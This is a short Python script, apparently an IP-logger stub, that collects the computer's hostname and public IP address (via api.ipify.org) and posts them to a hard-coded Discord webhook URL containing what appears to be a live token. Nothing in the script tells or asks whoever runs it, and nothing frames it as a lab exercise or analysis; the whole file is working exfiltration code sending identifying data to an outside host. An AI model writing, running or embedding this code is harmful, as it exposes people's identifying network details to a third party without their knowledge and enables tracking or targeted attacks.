from dhooks import Webhook , File
import socket
from requests import get

hook = Webhook("https://discord.com/api/webhooks/892315810696138782/oFCRoNI9hreoluc6JHcl9dDIXIS-Q6_0PWQJwVMgzNo8z080Yh-iGBITL1aq0m6tfpNA")


# name + ip
pcname = socket.gethostname()
ip = get('https://api.ipify.org'). text


hook.send(f"pc name : {pcname}\npc public ip : {ip} ")
